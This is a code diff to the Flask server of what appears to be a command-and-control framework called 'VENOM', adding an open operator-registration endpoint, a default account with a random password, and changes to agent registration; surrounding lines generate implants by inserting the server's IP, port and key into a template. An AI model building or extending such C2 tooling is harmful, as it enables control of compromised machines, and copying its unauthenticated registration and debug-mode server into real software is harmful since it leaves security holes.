@@ -62,8 +62,15 @@ if __name__ == "__main__":
                 return response
             else:
                 return 'Wrong creds!', 401
-        # except:
- #   return 'Some Internal error occured!', 500
+
+
+    @app.route('/register', methods=['POST']) 
+    def registerOperator(): 
+        try: 
+            register(request.json.get('email'), request.json.get('password'))  
+            return 'Registered Successfully', 200
+        except:
+           return 'Registration failed!', 500
 
     @app.route('/dashboard', methods=['GET'])
     @token_required(_SECRET_)
@@ -132,7 +139,7 @@ if __name__ == "__main__":
                 port = getListener(listenerId).get('port')
                 key = getListener(listenerId).get('key')
                 ip = s.getsockname()[0]
-                registerAgent(agentID, type, listenerId, ip, port)
+                registerAgent(agentID, type, listenerId, port)
                 implant = getImplant(type)
                 implant = implant.replace('REPLACE_IP', ip).replace(
                     'REPLACE_PORT', str(port)).replace('REPLACE_ID', agentID).replace('REPLACE_KEY', key)
@@ -170,8 +177,7 @@ if __name__ == "__main__":
             del agent['status'] 
             del agent['task'] 
             del agent['taskResult']
-            del agent['bindListenerID'] 
-            del agent['serverIP'] 
+            del agent['bindListenerID']  
             del agent['timeout']
             agents['agents'].append(agent)
         return agents , 200 
@@ -201,5 +207,7 @@ if __name__ == "__main__":
     parser = ArgumentParser(description='Welcome to VENOM')
     parser.add_argument('--port', type=int, required=True, default='8080', help='Port number, Default set to 8080')
     args = parser.parse_args()
-    migrate()
+    password = "".join(choices(digits, k = 12))
+    print("Creating a default account! ✅ ...\nEmail: venom@venom.local\nPassword: %s" % (password))
+    migrate(password)
     app.run(host='0.0.0.0', port=args.port, debug=True)
